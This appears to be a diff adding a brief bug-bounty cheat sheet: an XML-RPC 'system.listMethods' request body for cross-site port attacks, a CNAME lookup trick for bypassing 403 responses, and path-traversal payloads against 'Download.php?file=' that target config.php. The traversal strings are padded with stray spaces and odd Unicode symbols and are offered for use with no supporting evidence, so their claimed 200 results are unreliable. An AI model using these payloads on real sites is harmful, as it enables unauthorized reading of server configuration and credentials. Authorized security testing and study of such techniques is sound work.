@@ -1,0 +1,24 @@
+
+https://hackerone.com/reports/737323
+
+---------------------Inside the post request-----------------
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+
+for more info read -----> https://thehemdeep.medium.com/cross-site-port-attack-in-wild-9d2f6af36455
+-------------------------------------------------------
+
+Have you found a subdomain answering with "403" Forbidden"? Try again querying its CNAME record if available!
+You might end up with a "200" response
+
+cmd ----> dig -noall -answer
+
+https://janmuhammadzaidi.medium.com/how-i-bypassed-403-forbidden-domain-using-a-simple-trick-c2d538de04b8
+New 403 Bypass 🔥🔥🔥🔥
+Download.php?file=../config.php ==> 403
+
+Download.php?file=. /config.php⨀ ==> 200
+Download.php?file=⊡ /config.php⨀  ==> 200
+Download.php?file= .⊡ /config.php  ==> 200
